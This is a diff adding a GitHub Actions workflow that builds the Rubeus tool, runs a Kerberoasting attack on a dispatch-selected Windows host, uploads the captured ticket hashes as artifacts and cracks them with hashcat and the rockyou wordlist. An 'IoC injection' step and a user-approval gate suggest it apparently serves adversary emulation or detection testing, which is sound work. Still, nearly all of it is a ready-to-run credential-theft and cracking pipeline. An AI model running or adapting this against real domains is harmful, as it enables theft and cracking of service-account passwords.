@@ -1,0 +1,124 @@
+name: Exec Rubeus
+
+on:
+#   push:
+#     branches:
+#       - main
+  workflow_dispatch:
+    inputs:
+      hostlabels:
+        description: 'The label of the host to execute'
+        type: string
+        required: true
+
+jobs:
+  build-dotnet-tools:
+    runs-on: windows-2022
+
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v4
+        
+      - name: mkdir publish
+        run: |
+          mkdir ./publish
+        
+      - name: Install DNF 4.0 packs
+        shell: pwsh
+        working-directory: "C:\\Program Files (x86)\\Microsoft Visual Studio\\Installer"
+        run: |
+          $ProgressPreference = 'SilentlyContinue';
+          $t = "$env:TEMP\net40";
+          Invoke-WebRequest https://www.nuget.org/api/v2/package/Microsoft.NETFramework.ReferenceAssemblies.net40/1.0.3 -OutFile "$t.zip";
+          Expand-Archive "$t.zip" $t -Force;
+          Copy-Item "$t\build\.NETFramework\*" "${env:ProgramFiles(x86)}\Reference Assemblies\Microsoft\Framework\.NETFramework\" -Recurse -Force
+
+      - name: Add msbuild to PATH
+        uses: microsoft/setup-msbuild@v2
+
+      - name: Build Rubeus
+        run: |
+          # Set the repository variable to the git repository URL. e.g. https://github.com/GhostPack/Rubeus.git
+          git clone ${{ vars.RUBEUS_GIT_REPO_URL }}
+          cd Rubeus
+          dotnet restore
+          msbuild /p:Configuration=Release Rubeus.sln
+          copy ./Rubeus/bin/Release/Rubeus.exe ../publish/Rubeus.exe
+
+      - name: dir ./publish
+        run: |
+          dir ./publish
+
+      - name: IoC Injection
+        uses: ./.github/actions/utils/ioc-injector
+        with:
+          BINARY_PATH: ${{ github.workspace }}/publish/Rubeus.exe
+          
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: rubeus-files
+          path: ./publish
+          
+  exec-rubeus:
+    needs: build-dotnet-tools
+    runs-on: ${{ inputs.hostlabels }}
+
+    steps:
+      - name: Request User Approval
+        uses: ./.github/actions/utils/require-user-approval
+
+      # If you prefer notification only instead of approval:
+      #- name: User Notification
+      #  uses: ./.github/actions/utils/user-notification
+      
+      - name: Download artifacts
+        uses: actions/download-artifact@v4
+        with:
+          name: rubeus-files
+
+      - name: dir ./
+        run: |
+          dir ./
+
+      - name: Exec Rubeus
+        run: |
+          ./Rubeus.exe kerberoast /format:hashcat /outfile:hash.txt /nowrap 
+      
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v4
+        with:
+          name: hash.txt
+          path: ./hash.txt
+          
+  hash-crack:
+    needs: exec-rubeus
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Download artifacts
+        uses: actions/download-artifact@v4
+        with:
+          name: hash.txt
+          
+      - name: Install hashcat
+        run: sudo apt install hashcat -y
+
+      - name: Download wordlist(rockyou.txt)
+        run: |
+          curl -OL https://github.com/danielmiessler/SecLists/raw/refs/heads/master/Passwords/Leaked-Databases/rockyou.txt.tar.gz
+          tar xvzf rockyou.txt.tar.gz
+          ls -al
+
+      - name: Exec hashcat
+        run: |
+          first_line=$(head -n 1 hash.txt)
+          if [[ "$first_line" == *"$18$"* ]]; then
+            hashtype=19700
+          elif [[ "$first_line" == *"$23$"* ]]; then
+            hashtype=13100
+          fi
+          hashcat -m $hashtype -a 0 ./hash.txt ./rockyou.txt
+    
+  
+    
